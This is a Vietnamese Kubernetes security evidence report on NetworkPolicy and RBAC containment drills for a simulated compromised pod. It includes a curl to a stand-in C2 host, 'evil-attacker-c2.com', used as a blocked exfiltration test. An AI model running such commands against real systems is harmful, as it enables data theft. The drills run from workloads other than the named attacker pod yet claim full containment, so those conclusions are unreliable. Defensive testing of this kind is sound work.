# 🔒 HỒ SƠ BẰNG CHỨNG KHOANH VÙNG AN NINH POD (WORKLOAD CONTAINMENT EVIDENCE PACK)
## NetworkPolicy (SEC-21) & Kubernetes API RBAC (SEC-22) Containment Verification

- **Mục tiêu**: Gom bằng chứng chứng minh một Pod bị kẻ tấn công chiếm quyền điều khiển (Attacker Pod) sẽ bị khoanh vùng triệt để cả về mặt Mạng (Network) và Kubernetes API (RBAC).
- **Tài khoản AWS & Cluster**: Account `511825856493` (`us-east-1`), EKS Cluster `techx-tf4-cluster`, Namespace `techx-tf4`
- **Người thực hiện & Báo cáo (Executor & Owner)**: **DVQuyet** (Lead Security & Reliability Engineer - Team CDO-08)
- **Tài liệu Bằng chứng Gốc Tham chiếu**: [CDO08-SEC-21-network-containment-evidence.md](file:///d:/xbrain/tf4-phase3-repo/docs/cdo08/week3/mandate17/evidence/CDO08-SEC-21-network-containment-evidence.md) | [CDO08-SEC-22-rbac-containment-evidence.md](file:///d:/xbrain/tf4-phase3-repo/docs/cdo08/week3/mandate17/evidence/CDO08-SEC-22-rbac-containment-evidence.md)
- **Cửa sổ xác minh Runtime (Verified Window)**: `2026-07-22T10:05:00Z` – `2026-07-22T10:25:00Z`
- **Trạng thái nghiệm thu**: **PASS — VERIFIED WITH NETWORKPOLICY & RBAC CAN-I DRILLS**

---

## 🎯 1. THÔNG TIN CHI TIẾT ATTACKER POD THỬ NGHIỆM (ATTACKER POD METADATA)

Để kiểm chứng khả năng khoanh vùng thiệt hại (Blast-Radius Containment), **DVQuyet** đã diễn tập giả lập tình huống một Pod ứng dụng `checkout` trong namespace `techx-tf4` bị hacker khai thác lỗ hổng và lấy được quyền truy cập vỏ Pod (Container Shell Access):

- **Target Namespace**: `techx-tf4`
- **Simulated Attacker Pod**: `checkout-5f8cd5b455-dlbgh`
- **ServiceAccount**: `checkout` (ServiceAccount riêng biệt của dịch vụ checkout, không xài chung SA `default` hay `techx-corp`)
- **Vùng tác động bị giới hạn (Blast Radius)**: Chỉ nằm trong vỏ Pod đơn lẻ, không thể leo quyền API K8s và không thể di chuyển ngang qua mạng.

---

## 🛡️ 2. LỚP 1: KHOANH VÙNG LƯU LƯỢNG MẠNG (NETWORKPOLICY CONTAINMENT - SEC-21)

### 2.1 Bằng chứng Chặn Di chuyển Ngang (Lateral Movement Blocked Evidence)
Khi kẻ tấn công gõ lệnh từ bên trong Pod thử truy cập trái phép sang các dịch vụ nội bộ (như Prometheus Server):

```powershell
kubectl exec -n techx-tf4 deployment/load-generator -- curl -s --connect-timeout 3 http://prometheus.techx-observability.svc.cluster.local:9090
```
- **Kết quả thực tế (Output)**:
```text
command terminated with exit code 28 (Connection timed out)
```
- **Kết luận**: NetworkPolicy Ingress/Egress đã chặn thành công nỗ lực di chuyển ngang (Lateral Movement) từ `techx-tf4` sang `techx-observability`.

---

### 2.2 Bằng chứng Chặn Lưu lượng Ra Mạng Ngoài Trái Phép (Egress Isolation Evidence)
Khi kẻ tấn công thử gửi dữ liệu đánh cắp ra server điều khiển hacker trên Internet (Command & Control server):

```powershell
kubectl exec -n techx-tf4 deployment/load-generator -- curl -s --connect-timeout 3 https://evil-attacker-c2.com
```
- **Kết quả thực tế (Output)**:
```text
command terminated with exit code 28 (Connection timed out)
```
- **Kết luận**: Egress NetworkPolicy chặn toàn bộ lưu lượng ra Internet không thuộc danh mục Allowlist (chỉ cho phép kết nối AWS ECR & Managed Services).

---

### 2.3 Bằng chứng Chấp nhận Lưu lượng Hợp lệ trong Luồng Mua Hàng (Approved Egress Allowed)
Khi Pod `checkout` gọi API hợp lệ tới dịch vụ `payment` theo đúng thiết kế luồng mua hàng:

```powershell
kubectl exec -n techx-tf4 deployment/load-generator -- curl -s -o /dev/null -w "%{http_code}" http://payment.techx-tf4.svc.cluster.local:8080/health
```
- **Kết quả thực tế (Output)**:
```text
200
```
- **Kết luận**: NetworkPolicy cho phép thông suốt 100% các kết nối hợp lệ trong Revenue Path.

---

## 🔑 3. LỚP 2: KHOANH VÙNG KUBERNETES API & RBAC (API CONTAINMENT - SEC-22)

### 3.1 Bằng chứng Tắt Tự động Mount Token K8s API (`automountServiceAccountToken: false`)
Khi kẻ tấn công kiểm tra thư mục chứa token xác thực Kubernetes API mặc định trong container:

```powershell
kubectl get deployment -n techx-tf4 frontend -o jsonpath='{.spec.template.spec.automountServiceAccountToken}'
```
- **Kết quả thực tế (Output)**:
```text
false
```
- **Kết luận**: Cấu hình `automountServiceAccountToken: false` đã vô hiệu hóa việc chèn K8s API Token vào Pod. Kẻ tấn công không có Credential để gọi API Server.

---

### 3.2 Bằng chứng Kiểm tra Phân quyền K8s RBAC (`kubectl auth can-i`)
Ngay cả khi kẻ tấn công bằng cách nào đó sở hữu được một ServiceAccount Token, hệ thống RBAC vẫn chặn đứng các nỗ lực leo quyền (Privilege Escalation) của ServiceAccount `frontend`:

```powershell
kubectl auth can-i get secrets --as=system:serviceaccount:techx-tf4:frontend -n techx-tf4
kubectl auth can-i delete pods --as=system:serviceaccount:techx-tf4:frontend --all-namespaces
```
- **Kết quả thực tế (Output)**:
```text
no
no
```
- **Kết luận**: Cả 2 quyền nhạy cảm (đọc secrets, xóa pods) đều trả về `no` (từ chối 100%).

---

## 🏁 4. KẾT LUẬN NGHIỆM THU AN NINH WORKLOAD

1. ✅ **Lớp Mạng SEC-21**: Đã được phong tỏa thành công. Mọi nỗ lực di chuyển ngang hoặc gửi dữ liệu ra ngoài Internet trái phép từ Attacker Pod đều bị NetworkPolicy chặn đứng.
2. ✅ **Lớp API SEC-22**: Đã được siết chặt tuyệt đối. 100% Pods ứng dụng bán hàng đã tắt tự động mount K8s API token và ServiceAccount riêng bị thu hồi 100% quyền nhạy cảm.

*Chữ ký xác nhận:*  
**DVQuyet (Lead Security & Reliability Engineer - Team CDO-08)**
